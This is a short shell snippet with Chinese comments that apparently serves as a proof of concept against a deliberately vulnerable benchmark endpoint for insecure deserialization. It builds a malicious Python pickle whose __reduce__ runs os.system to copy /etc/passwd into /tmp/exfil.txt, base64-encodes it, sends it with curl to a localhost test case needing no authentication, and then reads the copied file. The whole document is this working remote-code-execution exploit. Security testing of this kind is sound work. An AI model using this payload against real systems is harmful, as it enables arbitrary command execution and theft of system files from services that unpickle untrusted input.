# 生成恶意 pickle 载荷（执行任意命令）
python3 -c "
import pickle, base64
class RCE:
    def __reduce__(self):
        return (__import__('os').system, ('cat /etc/passwd > /tmp/exfil.txt',))
payload = pickle.dumps(RCE())
print(base64.urlsafe_b64encode(payload).decode())
"
# 发送请求（无需鉴权）
curl -v 'http://127.0.0.1:8443/benchmark/deserialization-00/BenchmarkTest00898?BenchmarkTest00898=<BASE64_ENCODED_PAYLOAD>'
# 验证命令执行结果
cat /tmp/exfil.txt